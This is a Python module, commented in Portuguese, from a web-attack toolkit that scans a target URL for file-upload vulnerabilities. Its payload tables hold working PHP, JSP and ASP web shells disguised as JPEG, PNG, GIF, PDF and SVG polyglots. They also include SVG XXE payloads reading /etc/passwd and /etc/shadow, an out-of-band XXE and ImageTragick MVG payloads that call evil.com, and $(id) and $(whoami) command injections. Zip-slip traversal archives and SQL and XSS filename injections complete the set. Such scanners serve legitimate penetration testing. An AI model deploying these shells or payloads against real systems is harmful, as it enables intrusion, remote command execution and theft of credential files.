#!/usr/bin/env python3

"""Modulo de deteccao de File Upload Attacks.



Testa se uma aplicacao web e vulneravel a ataques de upload:

  - polyglot: Arquivos validos em multiplos formatos (JPEG+PHP, PNG+PHP, etc)

  - svg_xxe: SVG com payloads XXE via multipart upload

  - image_magic: Vulnerabilidades em processamento de imagem (ImageMagick)

  - zip_slip: ZIP com paths maliciosos para directory traversal

  - filename_inject: Injecao de comandos/SQL/XSS via campo filename

  - content_type: Conteudo executavel com MIME type seguro

  - multipart_boundary: Manipulacao de boundary no multipart/form-data



Fluxo:

  1. Envia request para a URL alvo (baseline)

  2. Detecta endpoint de upload (form action, /upload, /api/upload)

  3. Para cada categoria, monta payload multipart e envia via POST

  4. Verifica resposta (status, tamanho, refletido, erro)

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
from collections.abc import Awaitable, Callable
from dataclasses import asdict, dataclass
from urllib.parse import urljoin

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    fetch,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.fileupload")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "polyglot": [
        "jpg_php",
        "png_php",
        "gif_php",
        "pdf_php",
        "svg_php",
        "html_polyglot",
    ],
    "svg_xxe": [
        "xxe_basic",
        "xxe_file_read",
        "xxe_ssi",
        "xxe_oob",
        "xxe_cdata",
        "xxe_parameter",
    ],
    "image_magic": [
        "mvg_label",
        "label_delegate",
        "ussd_delegate",
        "mvg_svg",
        "clip_image",
        "read_populate",
    ],
    "zip_slip": [
        "zip_traversal",
        "zip_traversal_encoded",
        "zip_traversal_null",
        "zip_long_path",
        "zip_symlink",
        "zip_dotdot",
    ],
    "filename_inject": [
        "cmd_backtick",
        "cmd_dollar",
        "sql_single_quote",
        "xss_script",
        "path_traversal",
        "null_byte",
    ],
    "content_type": [
        "php_as_jpeg",
        "php_as_png",
        "php_as_gif",
        "jsp_as_jpeg",
        "asp_as_png",
        "elf_as_jpeg",
    ],
    "multipart_boundary": [
        "boundary_inject",
        "nested_multipart",
        "missing_boundary",
        "extra_boundary",
        "boundary_overflow",
        "chunked_boundary",
    ],
}


def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "fileupload", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()
_PHP_SHELL = b"<?php system($_GET['c']); ?>"

_JSP_SHELL = b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>'

_ASP_SHELL = b'<% eval(Request("c")) %>'

_ELF_HEADER = b"\x7fELF\x02\x01\x01\x00"

_SVG_OPEN = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
)

_XXE_DTD = b'<!DOCTYPE svg [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n'


_POLYGLOT_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "jpg_php",
        "polyglot.jpg.php",
        b"\xff\xd8\xff\xe0" + b"\x00" * 10 + _PHP_SHELL,
        "image/jpeg",
        ["<?php", "system"],
    ),
    (
        "png_php",
        "polyglot.png.php",
        b"\x89PNG\r\n\x1a\n" + b"\x00" * 10 + _PHP_SHELL,
        "image/png",
        ["<?php", "system"],
    ),
    (
        "gif_php",
        "polyglot.gif.php",
        b"GIF89a" + b"\x00" * 10 + _PHP_SHELL,
        "image/gif",
        ["<?php", "system"],
    ),
    (
        "pdf_php",
        "polyglot.pdf.php",
        b"%PDF-1.4" + b"\x00" * 10 + _PHP_SHELL,
        "application/pdf",
        ["<?php", "system"],
    ),
    (
        "svg_php",
        "polyglot.svg.php",
        _SVG_OPEN + b"\n<!--\n" + _PHP_SHELL + b"\n-->",
        "image/svg+xml",
        ["<?php", "svg"],
    ),
    (
        "html_polyglot",
        "polyglot.html.php",
        b"<!DOCTYPE html><html><body>" + _PHP_SHELL + b"</body></html>",
        "text/html",
        ["<?php", "html"],
    ),
]


_SVG_XXE_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "xxe_basic",
        "xxe_basic.svg",
        _SVG_OPEN + b"\n" + _XXE_DTD + b"<root>&xxe;</root>\n</svg>",
        "image/svg+xml",
        ["xxe", "file:///"],
    ),
    (
        "xxe_file_read",
        "xxe_file_read.svg",
        _SVG_OPEN
        + b"\n"
        + _XXE_DTD.replace(b"passwd", b"shadow")
        + b"<text>&xxe;</text>\n</svg>",
        "image/svg+xml",
        ["xxe", "shadow"],
    ),
    (
        "xxe_ssi",
        "xxe_ssi.svg",
        _SVG_OPEN
        + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<text>&xxe;</text>\n</svg>',
        "image/svg+xml",
        ["xxe", "hostname"],
    ),
    (
        "xxe_oob",
        "xxe_oob.svg",
        _SVG_OPEN
        + b'\n<!DOCTYPE svg [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>\n</svg>',
        "image/svg+xml",
        ["xxe", "evil.com"],
    ),
    (
        "xxe_cdata",
        "xxe_cdata.svg",
        _SVG_OPEN
        + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<text>&xxe;</text>\n</svg>',
        "image/svg+xml",
        ["xxe", "php://filter"],
    ),
    (
        "xxe_parameter",
        "xxe_parameter.svg",
        _SVG_OPEN
        + b'\n<!DOCTYPE svg [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome "%xxe;">]>\n<text>&callhome;</text>\n</svg>',
        "image/svg+xml",
        ["xxe", "ENTITY"],
    ),
]


_IMAGIC_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "mvg_label",
        "exploit.mvg",
        b'push graphic-context\nfont "label \'$(id)\'"\nfill "rgb(255,0,0)"\nrectangle 0,0,200,200\npop graphic-context',
        "image/mvg",
        ["label", "$(id)"],
    ),
    (
        "label_delegate",
        "exploit_label.mvg",
        b'push graphic-context\nfont "label:@/etc/passwd"\npop graphic-context',
        "image/mvg",
        ["label:", "/etc/passwd"],
    ),
    (
        "ussd_delegate",
        "exploit_ussd.mvg",
        b'push graphic-context\nimage overlay "ussd:$(id)" 0,0\npop graphic-context',
        "image/mvg",
        ["ussd:", "$(id)"],
    ),
    (
        "mvg_svg",
        "exploit_mvg.svg",
        b'push graphic-context\nimage "http://evil.com/evil.svg"\npop graphic-context',
        "image/svg+xml",
        ["image", "http://evil.com"],
    ),
    (
        "clip_image",
        "exploit_clip.mvg",
        b'push graphic-context\nclip-path url("https://evil.com/xxe.svg")\nimage 0,0,100,100,"test.jpg"\npop graphic-context',
        "image/mvg",
        ["clip-path", "url("],
    ),
    (
        "read_populate",
        "exploit_read.mvg",
        b'push graphic-context\nread "https://evil.com/evil.mvg"\npop graphic-context',
        "image/mvg",
        ["read", "http://evil.com"],
    ),
]


_ZIP_SLIP_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "zip_traversal",
        "traversal.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"../../etc/passwd\x00" + b"test",
        "application/zip",
        ["..", "/", "passwd"],
    ),
    (
        "zip_traversal_encoded",
        "traversal_encoded.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"..%2f..%2f..%2fetc%2fpasswd\x00" + b"test",
        "application/zip",
        ["..%2f", "passwd"],
    ),
    (
        "zip_traversal_null",
        "traversal_null.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"..%00/../../etc/passwd\x00" + b"test",
        "application/zip",
        ["..%00", "passwd"],
    ),
    (
        "zip_long_path",
        "long_path.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"A" * 5000 + b"\x00",
        "application/zip",
        ["A" * 100],
    ),
    (
        "zip_symlink",
        "symlink.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"symlink\x00" + b"../../etc/passwd",
        "application/zip",
        ["symlink", "passwd"],
    ),
    (
        "zip_dotdot",
        "dotdot.zip",
        b"PK\x03\x04" + b"\x00" * 26 + b"..\\\\..\\\\..\\\\etc\\\\passwd\x00" + b"test",
        "application/zip",
        ["..\\\\", "passwd"],
    ),
]


_FILENAME_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "cmd_backtick",
        "`$(whoami).jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["`", "$("],
    ),
    (
        "cmd_dollar",
        "$(whoami).jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["$(", "whoami"],
    ),
    (
        "sql_single_quote",
        "'; DROP TABLE--.jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["'", "DROP TABLE"],
    ),
    (
        "xss_script",
        "<script>alert(1)</script>.jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["<script>", "alert"],
    ),
    (
        "path_traversal",
        "../../../etc/passwd.jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["..", "/", "passwd"],
    ),
    (
        "null_byte",
        "shell.php%00.jpg",
        b"\xff\xd8\xff\xe0",
        "image/jpeg",
        ["%00", ".php"],
    ),
]


_CONTENT_TYPE_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
    (
        "php_as_jpeg",
        "shell.jpg",
        _PHP_SHELL,
        "image/jpeg",
        ["<?php"],
    ),
    (
        "php_as_png",
        "shell.png",
        _PHP_SHELL,
        "image/png",
        ["<?php"],
    ),
    (
        "php_as_gif",
        "shell.gif",
        _PHP_SHELL,
        "image/gif",
        ["<?php"],
    ),
    (
        "jsp_as_jpeg",
        "shell.jpg",
        _JSP_SHELL,
        "image/jpeg",
        ["Runtime", "exec"],
    ),
    (
        "asp_as_png",
        "shell.png",
        _ASP_SHELL,
        "image/png",
        ["eval", "Request"],
    ),
    (
        "elf_as_jpeg",
        "shell.elf",
        _ELF_HEADER + b"\x00" * 100,
        "image/jpeg",
        ["ELF"],
    ),
]


_BOUNDARY_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "boundary_inject",
        '------WebKitFormBoundary"onmouseover=alert(1)',
        "injected_field",
        ["onmouseover", "alert"],
    ),
    (
        "nested_multipart",
        "nested",
        "nested_content",
        ["Content-Disposition", "form-data"],
    ),
    (
        "missing_boundary",
        "",
        "no_boundary_field",
        [],
    ),
    (
        "extra_boundary",
        "extra------extra",
        "extra_field",
        ["extra"],
    ),
    (
        "boundary_overflow",
        "A" * 10000,
        "overflow_field",
        ["A" * 100],
    ),
    (
        "chunked_boundary",
        "chunked",
        "chunked_content",
        ["chunked"],
    ),
]


_ALL_PAYLOADS: dict[str, list] = {
    "polyglot": _POLYGLOT_PAYLOADS,
    "svg_xxe": _SVG_XXE_PAYLOADS,
    "image_magic": _IMAGIC_PAYLOADS,
    "zip_slip": _ZIP_SLIP_PAYLOADS,
    "filename_inject": _FILENAME_PAYLOADS,
    "content_type": _CONTENT_TYPE_PAYLOADS,
    "multipart_boundary": _BOUNDARY_PAYLOADS,
}


def _find_upload_endpoint(base_url: str, body_str: str) -> str | None:
    """Detecta endpoint de upload no HTML."""

    lower = body_str.lower()

    import re

    patterns = [
        r'<form[^>]+action\s*=\s*["\']?([^"\'>\s]+)',
        r'<input[^>]+type\s*=\s*["\']?file',
    ]

    for pattern in patterns:
        match = re.search(pattern, lower)

        if match:
            if "action" in pattern:
                action = match.group(1)

                return urljoin(base_url, action)

            return base_url

    common_paths = ["/upload", "/api/upload", "/file/upload", "/attachments"]

    for path in common_paths:
        if path in lower:
            return urljoin(base_url, path)

    return base_url


def _check_upload_reflection(body_str: str, indicators: list[str]) -> bool:
    """Verifica se indicadores do payload aparecem na resposta."""

    lower = body_str.lower()

    return any(ind.lower() in lower for ind in indicators)


@dataclass(frozen=True, slots=True)
class UploadAttempt:
    """Tentativa individual de File Upload Attack."""

    technique: str

    category: str

    filename: str

    content_type: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class UploadResult:
    """Resultado consolidado do scan de File Upload Attacks."""

    target: str

    tls: bool

    upload_endpoint: str | None

    baseline_status: int

    baseline_size: int

    attempts: list[UploadAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


async def _test_polyglot_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa uploads de polyglot files."""

    results: list[UploadAttempt] = []

    for technique, filename, content, content_type, indicators in _POLYGLOT_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="polyglot",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="Polyglot aceito e refletido" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="polyglot",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_svg_xxe_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa SVG XXE via upload."""

    results: list[UploadAttempt] = []

    for technique, filename, content, content_type, indicators in _SVG_XXE_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="svg_xxe",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="SVG XXE detectado" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="svg_xxe",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_imagemagic_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa ImageMagick/ImageTragick."""

    results: list[UploadAttempt] = []

    for technique, filename, content, content_type, indicators in _IMAGIC_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="image_magic",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="ImageMagick vulnerability detectada" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="image_magic",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_zip_slip_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa ZIP Slip."""

    results: list[UploadAttempt] = []

    for technique, filename, content, content_type, indicators in _ZIP_SLIP_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="zip_slip",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="ZIP Slip detectado" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="zip_slip",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_filename_inject_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa Filename Injection."""

    results: list[UploadAttempt] = []

    for technique, filename, content, content_type, indicators in _FILENAME_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="filename_inject",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="Filename injection detectado" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="filename_inject",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_content_type_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa Content-Type Mismatch."""

    results: list[UploadAttempt] = []

    for (
        technique,
        filename,
        content,
        content_type,
        indicators,
    ) in _CONTENT_TYPE_PAYLOADS:
        try:
            resp = await client.post(
                url,
                files={"file": (filename, content, content_type)},
                timeout=timeout,
            )

            body_str = resp.text

            reflected = _check_upload_reflection(body_str, indicators)

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="content_type",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="Content-Type mismatch aceito" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="content_type",
                    filename=filename,
                    content_type=content_type,
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_multipart_boundary_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[UploadAttempt]:
    """Testa Multipart Boundary Abuse."""

    results: list[UploadAttempt] = []

    for technique, boundary, field_name, indicators in _BOUNDARY_PAYLOADS:
        try:
            if not boundary:
                resp = await client.post(
                    url,
                    content=b'------\r\nContent-Disposition: form-data; name="file"\r\n\r\ntest\r\n',
                    headers={"Content-Type": "multipart/form-data"},
                    timeout=timeout,
                )

            else:
                resp = await client.post(
                    url,
                    content=f'------{boundary}\r\nContent-Disposition: form-data; name="{field_name}"\r\n\r\ntest\r\n------{boundary}--\r\n'.encode(),
                    headers={
                        "Content-Type": f"multipart/form-data; boundary=------{boundary}"
                    },
                    timeout=timeout,
                )

            body_str = resp.text

            reflected = (
                _check_upload_reflection(body_str, indicators)
                if indicators
                else resp.status_code != b_status
            )

            results.append(
                UploadAttempt(
                    technique=technique,
                    category="multipart_boundary",
                    filename="(boundary)",
                    content_type="multipart/form-data",
                    method="POST",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=abs(len(resp.content) - b_size) > 50,
                    vulnerable=reflected,
                    details="Boundary abuse detectado" if reflected else "",
                    error="",
                    exploit="polyglot_file_content" if reflected else "",
                    tool="curl",
                )
            )

        except Exception as e:
            results.append(
                UploadAttempt(
                    technique=technique,
                    category="multipart_boundary",
                    filename="(boundary)",
                    content_type="multipart/form-data",
                    method="POST",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


_CATEGORY_TESTERS: dict[str, Callable[..., Awaitable[list[UploadAttempt]]]] = {
    "polyglot": _test_polyglot_category,
    "svg_xxe": _test_svg_xxe_category,
    "image_magic": _test_imagemagic_category,
    "zip_slip": _test_zip_slip_category,
    "filename_inject": _test_filename_inject_category,
    "content_type": _test_content_type_category,
    "multipart_boundary": _test_multipart_boundary_category,
}


def print_results(result: UploadResult) -> None:
    """Exibe os resultados do scan de File Upload Attacks."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]

    errors = [a for a in result.attempts if a.error]

    print(color("\n--- File Upload Attacks Detection ---", Cyber.CYAN, Cyber.BOLD))

    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))

    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))

    print(
        color(f"  Upload:       {result.upload_endpoint or 'auto-detect'}", Cyber.WHITE)
    )

    print(
        color(
            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.WHITE,
        )
    )

    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))

    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))

    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))

    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))

        seen: set[str] = set()

        for a in vuln:
            key = f"{a.technique}:{a.filename}"

            if key in seen:
                continue

            seen.add(key)

            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))

            print(color(f"      Arquivo: {a.filename} ({a.content_type})", Cyber.WHITE))

            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))

            print_exploit_info(a.exploit, a.tool)

        print(
            color(
                f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes",
                Cyber.WHITE,
            )
        )

    else:
        print(
            color(
                "\n  [+] Nenhuma vulnerabilidade de File Upload detectada", Cyber.GREEN
            )
        )

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))

        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
) -> int:
    """Executa o scan de File Upload Attacks."""

    logger.info("File Upload scan para %s", target)

    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout) as client:
        try:
            b_status, _b_headers, b_body, _b_raw = await fetch(
                client, target, timeout=timeout
            )

            b_size = len(b_body)

        except Exception as e:
            logger.warning("Erro ao acessar %s: %s", target, e)

            return 1

        body_str = b_body.decode(errors="replace")

        upload_endpoint = _find_upload_endpoint(target, body_str)

        all_attempts: list[UploadAttempt] = []

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        for cat in test_categories:
            tester = _CATEGORY_TESTERS.get(cat)

            if tester:
                all_attempts.extend(
                    await tester(
                        client, upload_endpoint or target, timeout, b_status, b_size
                    ),
                )

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})

        blocked_techs = list(
            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
        )

        issues: list[str] = []

        if not all_attempts:
            issues.append("Nenhum teste de File Upload executado")

        if not upload_endpoint:
            issues.append("Endpoint de upload nao detectado â€” testando URL principal")

        result = UploadResult(
            target=target,
            tls=tls,
            upload_endpoint=upload_endpoint,
            baseline_status=b_status,
            baseline_size=b_size,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable"
            if vuln_techs
            else ("safe" if blocked_techs else "unknown"),
        )

        print_results(result)

        logger.info(
            "File Upload scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""

    art = r"""

    _____ _______ ______   ______ _             _____  ______ _           _

   |  __ \__   __|  ____| |  ____| |           |  __ \|  ____(_)         | |

   | |  | | | |  | |__    | |__  | | __ _  __ _| |__) | |__  _ _ __   __| | ___ _ __

   | |  | | | |  |  __|   |  __| | |/ _` |/ _` |  ___/|  __| | | '_ \ / _` |/ _ \ '__|

   | |__| | | |  | |      | |    | | (_| | (_| | |    | |    | | | | | (_| |  __/ |

   |_____/  |_|  |_|      |_|    |_|\__,_|\__, |_|    |_|    |_|_| |_|\__,_|\___|_|

                                           __/ |

                                          |___/

"""

    create_banner(
        art,
        "   fileupload: polyglot, svg_xxe, image_magic, zip_slip, filename, content_type, boundary",
    )()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""

    parser = argparse.ArgumentParser(
        prog="mytools-fileupload",
        description="File Upload Attacks â€” detecta polyglots, XXE, ImageMagick, ZIP Slip, filename injection.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-fileupload https://target.com/upload\n"
            "  mytools-fileupload https://target.com -c polyglot\n"
            "  mytools-fileupload https://target.com -c svg_xxe\n"
            "  mytools-fileupload https://target.com -c zip_slip\n"
            "  mytools-fileupload https://target.com --proxy http://127.0.0.1:8080"
        ),
    )

    parser.add_argument("url", help="URL alvo para o scan")

    parser.add_argument(
        "-c",
        "--category",
        default="all",
        choices=[
            "all",
            "polyglot",
            "svg_xxe",
            "image_magic",
            "zip_slip",
            "filename_inject",
            "content_type",
            "multipart_boundary",
        ],
        help="Categoria de testes (default: todas)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan File Upload a partir de argumentos parseados."""

    logger.info("File Upload scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
        ),
    )


def main() -> int:
    """Entry point do modulo File Upload Attacks."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="fileupload> ",
        description="File Upload Attacks interativo.",
        example="https://target.com/upload -c polyglot",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com/upload\n"
            "  https://target.com -c polyglot\n"
            "  https://target.com -c svg_xxe\n"
            "  https://target.com -c zip_slip\n"
            "  https://target.com --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
